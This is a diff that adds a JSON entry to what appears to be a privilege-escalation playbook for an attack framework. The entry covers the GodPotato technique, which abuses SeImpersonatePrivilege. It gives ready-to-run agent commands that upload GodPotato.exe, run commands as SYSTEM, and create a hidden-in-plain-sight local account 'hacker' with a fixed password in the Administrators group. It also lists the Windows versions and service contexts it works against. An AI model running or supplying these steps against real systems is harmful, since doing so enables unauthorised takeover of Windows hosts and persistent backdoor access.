@@ -1,0 +1,16 @@
+{
+  "id": "win_seimpersonate_godpotato",
+  "category": "WIN_TOKEN_PRIV",
+  "binary": null,
+  "cve": null,
+  "exploitation": [
+    "upload <id> /path/to/GodPotato.exe",
+    "exec <id> C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
+    "exec <id> C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add\""
+  ],
+  "post_exploit": ["exec <id> whoami /priv"],
+  "notes": "Works on Windows Server 2012–2022, Windows 8–11. Requires SeImpersonatePrivilege. Upload GodPotato.exe first. Works in most IIS/MSSQL/service contexts.",
+  "source": "github.com/BeichenDream/GodPotato",
+  "tags": ["windows", "seimpersonate", "potato", "token"],
+  "severity": "high"
+}
